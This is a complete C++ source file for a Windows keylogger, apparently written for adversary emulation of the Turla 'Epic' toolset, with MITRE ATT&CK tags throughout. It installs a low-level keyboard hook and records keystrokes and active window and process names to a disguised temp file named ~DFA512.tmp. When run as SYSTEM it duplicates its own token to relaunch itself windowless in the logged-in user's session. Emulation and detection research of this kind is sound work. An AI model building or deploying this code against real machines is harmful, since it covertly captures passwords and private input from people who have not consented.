// Reference: https://github.com/101123/WH_KEYBOARD_LL-Global-Hook/blob/main/main.cpp
// CTI reference: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf, page 2

#define WIN32_LEAN_AND_MEAN // Exclude rarely-used stuff from Windows headers

#include <Windows.h>
#include <WinBase.h>
#include <chrono>
#include <ctime>
#include <mutex>
#include <thread>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <psapi.h>
#include <WtsApi32.h>
#include <string>

const int WIN_NAME_MAX_LENGTH = 127;
const int KEY_NAME_BUFFER_MAX_LENGTH = 64;
const int HOST_NAME_BUFFER_MAX_LENGTH = 256;
const int PROC_FILE_PATH_BUFFER_MAX_LENGTH = 256;

// For now, just use global variable for callback func to easily reference, since we can't change their signature.
std::ofstream globalLogFile;

// Mutex for outputting to stdout/stderr and to the log file.
std::mutex outputMutex;

/*
 * GetComputerName:
 *      About:
 *          Get the current computer name as a string.
 *      Result:
 *          std::string containing current hostname. "Unknown Host" on failure.
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 *      CTI:
 *          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
 */
std::string GetComputerName() {
    const int buffer_size = MAX_COMPUTERNAME_LENGTH + 1;
    char buffer[buffer_size];
    DWORD lpnSize = buffer_size;
    if (GetComputerNameA(buffer, &lpnSize) == FALSE) {
        return ("Unknown Host");
    }
    return std::string{ buffer };
};

/*
 * GetKeyRepresentation:
 *      About:
 *          Get the correct key representation for the virtual keycode
 *      Result:
 *          std::string containing key representation for virtual keycode. "UNKNOWN KEY" if keycode not known.
 *      MITRE ATT&CK Techniques:
 *          T1056.001: Input Capture: Keylogging
 *      CTI:
 *          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
 *      Other References:
 *          https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 *          http://www.kbdedit.com/manual/low_level_vk_list.html
 */
std::string GetKeyRepresentation(DWORD vkCode) {
    if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) {
        return std::string(1, (char)vkCode);
    }
    
    switch (vkCode) {
    case VK_LBUTTON:
        return "[LEFT MOUSE BUTTON]";
    case VK_RBUTTON:
        return "[RIGHT MOUSE BUTTON]";
    case VK_CANCEL:
        return "[CTRL+BREAK PROCESSING]";
    case VK_MBUTTON:
        return "[MIDDLE MOUSE BUTTON]";
    case VK_XBUTTON1:
        return "[X1 MOUSE BUTTON]";
    case VK_XBUTTON2:
        return "[X2 MOUSE BUTTON]";
    case VK_BACK:
        return "[BACKSPACE]";
    case VK_TAB:
        return "[TAB]";
    case VK_CLEAR:
        return "[CLEAR]";
    case VK_RETURN:
        return "[ENTER]";
    case VK_SHIFT:
        return "[SHIFT]";
    case VK_CONTROL:
        return "[CTRL]";
    case VK_MENU:
        return "[ALT]";
    case VK_PAUSE:
        return "[PAUSE]";
    case VK_CAPITAL:
        return "[CAPS LOCK]";
    case VK_KANA: // same as VK_HANGUL
        return "[IME KANA MODE]";
    case VK_IME_ON:
        return "[IME ON]";
    case VK_JUNJA:
        return "[IME JUNJA MODE]";
    case VK_FINAL:
        return "[IME FINAL MODE]";
    case VK_HANJA: // same as VK_KANJI
        return "[IME HANJA MODE]";
    case VK_IME_OFF:
        return "[IME OFF]";
    case VK_ESCAPE:
        return "[ESCAPE]";
    case VK_CONVERT:
        return "[IME CONVERT]";
    case VK_NONCONVERT:
        return "[IME NONCONVERT]";
    case VK_ACCEPT:
        return "[IME ACCEPT]";
    case VK_MODECHANGE:
        return "[IME MODE CHANGE]";
    case VK_SPACE:
        return "[SPACE]";
    case VK_PRIOR:
        return "[PAGE UP]";
    case VK_NEXT:
        return "[PAGE DOWN]";
    case VK_END:
        return "[END]";
    case VK_HOME:
        return "[HOME]";
    case VK_LEFT:
        return "[LEFT ARROW]";
    case VK_UP:
        return "[UP ARROW]";
    case VK_RIGHT:
        return "[RIGHT ARROW]";
    case VK_DOWN:
        return "[DOWN ARROW]";
    case VK_SELECT:
        return "[SELECT]";
    case VK_PRINT:
        return "[PRINT]";
    case VK_EXECUTE:
        return "[EXECUTE]";
    case VK_SNAPSHOT:
        return "[PRINT SCREEN]";
    case VK_INSERT:
        return "[INSERT]";
    case VK_DELETE:
        return "[DELETE]";
    case VK_HELP:
        return "[HELP]";
    case VK_LWIN:
        return "[WIN KEY(LEFT)]";
    case VK_RWIN:
        return "[WIN KEY(RIGHT)]";
    case VK_APPS:
        return "[APPLICATIONS KEY]";
    case VK_SLEEP:
        return "[SLEEP]";
    case VK_NUMPAD0:
        return "[NUMPAD 0]";
    case VK_NUMPAD1:
        return "[NUMPAD 1]";
    case VK_NUMPAD2:
        return "[NUMPAD 2]";
    case VK_NUMPAD3:
        return "[NUMPAD 3]";
    case VK_NUMPAD4:
        return "[NUMPAD 4]";
    case VK_NUMPAD5:
        return "[NUMPAD 5]";
    case VK_NUMPAD6:
        return "[NUMPAD 6]";
    case VK_NUMPAD7:
        return "[NUMPAD 7]";
    case VK_NUMPAD8:
        return "[NUMPAD 8]";
    case VK_NUMPAD9:
        return "[NUMPAD 9]";
    case VK_MULTIPLY:
        return "[NUMPAD *]";
    case VK_ADD:
        return "[NUMPAD +]";
    case VK_SEPARATOR:
        return "[SEPARATOR]";
    case VK_SUBTRACT:
        return "[NUMPAD -]";
    case VK_DECIMAL:
        return "[NUMPAD .]";
    case VK_DIVIDE:
        return "[NUMPAD /]";
    case VK_F1:
        return "[F1]";
    case VK_F2:
        return "[F2]";
    case VK_F3:
        return "[F3]";
    case VK_F4:
        return "[F4]";
    case VK_F5:
        return "[F5]";
    case VK_F6:
        return "[F6]";
    case VK_F7:
        return "[F7]";
    case VK_F8:
        return "[F8]";
    case VK_F9:
        return "[F9]";
    case VK_F10:
        return "[F10]";
    case VK_F11:
        return "[F1]";
    case VK_F12:
        return "[F12]";
    case VK_F13:
        return "[F13]";
    case VK_F14:
        return "[F1]4";
    case VK_F15:
        return "[F15]";
    case VK_F16:
        return "[F16]";
    case VK_F17:
        return "[F17]";
    case VK_F18:
        return "[F18]";
    case VK_F19:
        return "[F19]";
    case VK_F20:
        return "[F20]";
    case VK_F21:
        return "[F21]";
    case VK_F22:
        return "[F22]";
    case VK_F23:
        return "[F23]";
    case VK_F24:
        return "[F24]";
    case VK_NUMLOCK:
        return "[NUMLOCK]";
    case VK_SCROLL:
        return "[SCROLL LOCK]";
    case VK_LSHIFT:
        return "[SHIFT (LEFT)]";
    case VK_RSHIFT:
        return "[SHIFT (RIGHT)]";
    case VK_LCONTROL:
        return "[CTRL (LEFT)]";
    case VK_RCONTROL:
        return "[CTRL (RIGHT)]";
    case VK_LMENU:
        return "[ALT (LEFT)]";
    case VK_RMENU:
        return "[ALT (RIGHT)]";
    case VK_BROWSER_BACK:
        return "[BROWSER BACK]";
    case VK_BROWSER_FORWARD:
        return "[BROWSER FORWARD]";
    case VK_BROWSER_REFRESH:
        return "[BROWSER REFRESH]";
    case VK_BROWSER_STOP:
        return "[BROWSER STOP]";
    case VK_BROWSER_SEARCH:
        return "[BROWSER SEARCH]";
    case VK_OEM_PLUS:
        return "+";
    case VK_OEM_COMMA:
        return ",";
    case VK_OEM_MINUS:
        return "-";
    case VK_OEM_PERIOD:
        return ".";

    // Misc OEM char keys. Can vary by keyboard. Assuming US Standard Keyboard
    case VK_OEM_1:
        return ";";
    case VK_OEM_2:
        return "/";
    case VK_OEM_3:
        return "`";
    case VK_OEM_4:
        return "[";
    case VK_OEM_5:
        return "\\";
    case VK_OEM_6:
        return "]";
    case VK_OEM_7:
        return "'";
    default:
        return "UNKNOWN KEY";
    }
}


// Helper function: return true if the keycode is for a key that we want to track key down/up, such as shift, ctrl, windows, alt
bool TrackKeyHeld(DWORD vkCode) {
    switch (vkCode) {
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
    case VK_MENU:
    case VK_LMENU:
    case VK_RMENU:
    case VK_LWIN:
    case VK_RWIN:
        return TRUE;
    default:
        return FALSE;
    }
}

/*
 * OutputKeystrokeInfo:
 *      About:
 *          Output the keystroke information for the given key. 
 *          If pressed is true, then the output will indicate that the key was pressed. 
 *          If pressed is false, then the output will indicate that the key was released.
 *      MITRE ATT&CK Techniques:
 *          T1056.001: Input Capture: Keylogging
 *      CTI:
 *          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
 */
void OutputKeystrokeInfo(std::string keyName, bool pressed) {
    std::lock_guard<std::mutex> guard(outputMutex);
    globalLogFile << "Key " << (pressed ? "Pressed" : "Released") << ": " << keyName << "\n";
    globalLogFile.flush();
}

/*
 * LowLevelKeyboardProc:
 *      About:
 *          Callback function for the WH_KEYBOARD_LL hook.
 *      MITRE ATT&CK Techniques:
 *          T1056.001: Input Capture: Keylogging
 *      CTI:
 *          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
 *      Other References:
 *          https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
 *          https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
 *          https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 */
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    PKBDLLHOOKSTRUCT kbInputStruct = (PKBDLLHOOKSTRUCT&)lParam;
    std::string keyName = GetKeyRepresentation(kbInputStruct->vkCode);

    switch (wParam) {
        case WM_KEYDOWN:
            OutputKeystrokeInfo(keyName, true);
            break;
        case WM_SYSKEYDOWN:
            OutputKeystrokeInfo(keyName, true);
            break;
        case WM_KEYUP:
            if (TrackKeyHeld(kbInputStruct->vkCode)) {
                OutputKeystrokeInfo(keyName, false);
            }
            break;
        case WM_SYSKEYUP:
        default:
            break;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// https://docs.microsoft.com/en-us/windows/console/handlerroutine
// Used to catch signals for graceful shutdown
BOOL WINAPI CtrlHandler(_In_ DWORD dwCtrlType) {
    std::lock_guard<std::mutex> guard(outputMutex);
    switch (dwCtrlType) {
    case CTRL_C_EVENT:
        globalLogFile << "Terminating via ctrl+c\n";
        break;

    case CTRL_CLOSE_EVENT:
        globalLogFile << "Terminating via ctrl+close\n";
        break;

    case CTRL_BREAK_EVENT:
        globalLogFile << "Terminating via ctrl+break\n";
        break;

    case CTRL_LOGOFF_EVENT:
        globalLogFile << "Terminating via logoff\n";
        break;

    case CTRL_SHUTDOWN_EVENT:
        globalLogFile << "Terminating via shutdown\n";
        break;

    default:
        break;
    }
    globalLogFile.close();
    return FALSE; // pass to other handlers
}

/*
 * LogWindowInfo:
 *      About:
 *          Log window information for the given window handle.
 *      MITRE ATT&CK Techniques:
 *          T1010: Application Window Discovery
 *      CTI:
 *          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
 *      Other References:
 *          https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulefilenameexa
 */
void LogWindowInfo(HWND hWindow) {
    if (hWindow == NULL) {
        return;
    }

    // Get window title
    char windowNameBuffer[WIN_NAME_MAX_LENGTH + 1];
    if (!GetWindowTextA(hWindow, windowNameBuffer, WIN_NAME_MAX_LENGTH)) {
        // explorer.exe doesn't give back a window title.
        windowNameBuffer[0] = 0;
    }

    // Get process information for the window
    DWORD windowProcId;
    DWORD error_code;
    GetWindowThreadProcessId(hWindow, &windowProcId);
    char procPathBuffer[PROC_FILE_PATH_BUFFER_MAX_LENGTH];
    if (windowProcId) {
        HANDLE hWinProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, windowProcId);
        if (hWinProc != NULL) {
            int result = GetModuleFileNameExA(hWinProc, NULL, procPathBuffer, PROC_FILE_PATH_BUFFER_MAX_LENGTH);
            CloseHandle(hWinProc);
            std::lock_guard<std::mutex> guard(outputMutex);
            if (result > 0) {
                globalLogFile << "[" << procPathBuffer << ": " << windowNameBuffer << "]\n";
            } else {
                std::cerr << "Could not get file path for process ID " << windowProcId << std::endl;
                globalLogFile << "Could not get file path for process ID " << windowProcId << "\n";
            }
            globalLogFile.flush();
        } else {
            error_code = GetLastError();
            std::lock_guard<std::mutex> guard(outputMutex);
            std::cerr << "Could not open process ID " << windowProcId << ". Error code: " << error_code << std::endl;
            globalLogFile << "Could not open process ID " << windowProcId << ". Error code: " << error_code << "\n";
            globalLogFile.flush();
        }
    } else {
        error_code = GetLastError();
        std::lock_guard<std::mutex> guard(outputMutex);
        std::cerr << "Could not get process ID for window: " << windowNameBuffer << ". Error code: " << error_code << std::endl;
        globalLogFile << "Could not get process ID for window: " << windowNameBuffer << ". Error code: " << error_code << "\n";
        globalLogFile.flush();
    }
}

/*
 * GetActiveSessionId:
 *      About:
 *          Get the active session ID.
 *      Result:
 *           True on success, otherwise False. On success, populates session_id with the active session ID.
 *      MITRE ATT&CK Techniques:
 *          T1033: System Owner/User Discovery
 *      CTI:
 *          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
 */
BOOL GetActiveSessionId(DWORD* session_id) {
    PWTS_SESSION_INFOW pwsi = nullptr;
    DWORD num_sessions;
    DWORD error_code;

    if (!WTSEnumerateSessionsW(WTS_CURRENT_SERVER, 0, 1, &pwsi, &num_sessions)) {
        error_code = GetLastError();
        std::cerr << "Failed to get sessions. Error code: " << error_code << std::endl;
        globalLogFile << "Failed to get sessions. Error code: " << error_code << ".\n";
        return FALSE;
    }

    for (DWORD i = 0; i < num_sessions; i++) {
        if (pwsi[i].State == WTSActive) {
            *session_id = pwsi[i].SessionId;
            return TRUE;
        }
    }

    std::cerr << "Failed to find any active sessions." << std::endl;
    globalLogFile << "Failed to find any active sessions.";
    return FALSE;
}


/*
 * GetCurrWindowHandle:
 *      About:
 *          Loop every 100ms and check the active current window handle. If the window handle has changed since last time, log the new window info.
 *          Must be run in a separate thread.
 *      MITRE ATT&CK Techniques:
 *          T1010: Application Window Discovery
 *      CTI:
 *          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
 */
void GetCurrWindowHandle(HWND* hWindow) {
    HWND prevHandle = *hWindow;
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        HWND newHandle = GetForegroundWindow(); // This can be NULL when a window is losing activation.
        if (newHandle != NULL) {
            *hWindow = newHandle;
            if (prevHandle != newHandle) {
                prevHandle = newHandle;
                LogWindowInfo(newHandle);
            }
        }
    }
}

/*
 * RestartSelfWithToken:
 *      About:
 *          Restart the current executable using the provided token.
 *          Used to restart the keylogger in the active session if running as SYSTEM.
 *      MITRE ATT&CK Techniques:
 *          T1134.002: Access Token Manipulation: Create Process with Token
 */
BOOL RestartSelfWithToken(HANDLE token) {
    wchar_t exec_path[MAX_PATH];
    DWORD result = GetModuleFileNameW(
        NULL,
        exec_path,
        MAX_PATH
    );
    if (!result || result == MAX_PATH) {
        DWORD error_code = GetLastError();
        std::cerr << "Could not get current executable filepath. Error code: " << error_code << std::endl;
        globalLogFile << "Could not get current executable filepath. Error code: " << error_code << ".\n";
        return FALSE;
    }

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
    PROCESS_INFORMATION pi;
    return CreateProcessAsUserW(
        token,
        NULL,
        exec_path,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
}

/*
 * RestartInActiveSession:
 *      About:
 *          Restart the keylogger in the active session.
 *      Result:
 *          Returns 0 on success, otherwise some non-zero return value.
 *      MITRE ATT&CK Techniques:
 *          T1033: System Owner/User Discovery
 *          T1134: Access Token Manipulation
 *          T1134.002: Access Token Manipulation: Create Process with Token
 */
int RestartInActiveSession() {
    HANDLE h_curr_proc = NULL;
    HANDLE h_curr_proc_token = NULL;
    HANDLE h_dup_token = NULL;
    DWORD error_code;
    DWORD active_session_id;
    int ret_val = 0;

    do {
        // Get active session ID
        if (GetActiveSessionId(&active_session_id)) {
            std::cout << "Discovered active session ID " << active_session_id << std::endl;
            globalLogFile << "Discovered active session ID " << active_session_id << ".\n";
        } else {
            ret_val = 1;
            break;
        }

        // Get a handle to our current process token so we can duplicate it
        h_curr_proc = GetCurrentProcess();
        if (h_curr_proc == NULL) {
            error_code = GetLastError();
            std::cerr << "Could not open handle to current process. Error code: " << error_code << std::endl;
            globalLogFile << "Could not open handle to current process. Error code: " << error_code << ".\n";
            ret_val = 2;
            break;
        }
        
        if (!OpenProcessToken(h_curr_proc, TOKEN_ALL_ACCESS, &h_curr_proc_token) || h_curr_proc_token == NULL) {
            error_code = GetLastError();
            
            std::cerr << "Failed to get access token for curr process. Error code: " << error_code << std::endl;
            globalLogFile << "Failed to get access token for curr process. Error code: " << error_code << ".\n";
            ret_val = 3;
            break;
        }

        // Create a new primary token to use for creating the new process
        if (!DuplicateTokenEx(h_curr_proc_token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &h_dup_token)) {
            error_code = GetLastError();
            std::cerr << "Failed to duplicate access token for curr process. Error code: " << error_code << std::endl;
            globalLogFile << "Failed to duplicate access token for curr process. Error code: " << error_code << ".\n";
            ret_val = 4;
            break;
        }
        
        // Set the session ID for the new token to be the active session ID to run the process there
        if (!SetTokenInformation(h_dup_token, TokenSessionId, &active_session_id, sizeof(active_session_id))) {
            error_code = GetLastError();
            std::cerr << "Failed to adjust duplicated primary token for curr process. Error code: " << error_code << std::endl;
            globalLogFile << "Failed to adjust duplicated primary token for curr process. Error code: " << error_code << ".\n";
            ret_val = 5;
            break;
        }

        // Restart self
        if (!RestartSelfWithToken(h_dup_token)) {
            error_code = GetLastError();
            std::cerr << "Failed to created process with duplicated token. Error code: " << error_code << std::endl;
            globalLogFile << "Failed to created process with duplicated token. Error code: " << error_code << ".\n";
            ret_val = 6;
            break;
        } else {
            std::cout << "Restarted self in active session ID " << active_session_id << std::endl;
            globalLogFile << "Restarted self in active session ID " << active_session_id << "\n";
        }
    } while (FALSE);

    if (h_curr_proc != NULL) CloseHandle(h_curr_proc);
    if (h_curr_proc_token != NULL) CloseHandle(h_curr_proc_token);
    if (h_dup_token != NULL) CloseHandle(h_dup_token);

    return ret_val;
}

// Indicate a new session in the log file
void LogSessionStart() {
    // Get Machine name and write session info after opening file.
    std::string computerName = GetComputerName();

    std::string str;
    for (int i = 0; i < 50; ++i)
    {
        str += "-";
    }
    globalLogFile << str << "\n";
    globalLogFile << "New Session: " << computerName << "\n" << std::flush;
    globalLogFile << str << "\n";
}

int main(int argc, char** argv) {
    CHAR tempPath[MAX_PATH] = { 0 };
    DWORD tPath;
    tPath = GetTempPathA(MAX_PATH, tempPath);

    // If GetTempPathA fails, throw an error and exit.
    if (tPath == 0) {
        DWORD dLastError = GetLastError();
        throw std::runtime_error("Error getting temp path: " + std::to_string(dLastError));
        return 0;
    }
    std::string sPath = tempPath;
    sPath += +"~DFA512.tmp";
    globalLogFile.open(sPath, std::ios::out | std::ios::app);

    // Check if running in restart mode.
    if (argc > 1 && std::string(argv[1]) == std::string("-r")) {
        LogSessionStart();

        // Restart self in current active session
        int result = RestartInActiveSession();
        globalLogFile.close();
        return result;
    }

    // Start thread to get current window handle periodically
    HWND hCurrWindow = NULL;
    std::thread currWinGetterThread(GetCurrWindowHandle, &hCurrWindow);
    {
        std::lock_guard<std::mutex> guard(outputMutex);
        std::cout << "Monitoring window information..." << std::endl;
        globalLogFile << "Monitoring window information...\n";
    }

    // Set handler for console control signals (e.g. ctrl+c).
    // This allows us to do graceful cleanup like adding termination messages to our log file and closing the file before termination.
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
        std::lock_guard<std::mutex> guard(outputMutex);
        std::cerr << "Could not set ctrl handler" << std::endl;
        globalLogFile << "Could not set ctrl handler\n";
        globalLogFile.close();
        return 7;
    } else {
        std::lock_guard<std::mutex> guard(outputMutex);
        globalLogFile << "Set ctrl handler\n";
    }

    // Set our low-level keyboard hook procedure.
    // T1056.001: Input Capture: Keylogging
    // Reference: https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa?redirectedfrom=MSDN
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::lock_guard<std::mutex> guard(outputMutex);
        std::cerr << "Failed to start" << std::endl;
        globalLogFile << "Failed to start\n";
        globalLogFile.close();
        return 8;
    } else {
        std::lock_guard<std::mutex> guard(outputMutex);
        std::cout << "Set hooks" << std::endl;
        globalLogFile << "Set hooks\n";
    }

    // This message loop is required for Windows to call our hook callback.
    // Make sure we grab keystrokes for the currently active window.
    // https://stackoverflow.com/a/7460728
    MSG MSG;
    while (!GetMessage(&MSG, hCurrWindow, 0, 0)) {
        TranslateMessage(&MSG);
        DispatchMessage(&MSG);
    }

    // Windows should auto-remove the hook after enough inactivity, but we'll unhook here just in case.
    std::lock_guard<std::mutex> guard(outputMutex);
    if (UnhookWindowsHookEx(keyboardHook)) {
        std::cout << "Unhooked" << std::endl;
        globalLogFile << "Unhooked\n";
    } else {
        std::cerr << "Failed to unhook" << std::endl;
        globalLogFile << "Failed to unhook\n";
    }
    globalLogFile.close();
    CloseHandle(keyboardHook);

    return 0;

}
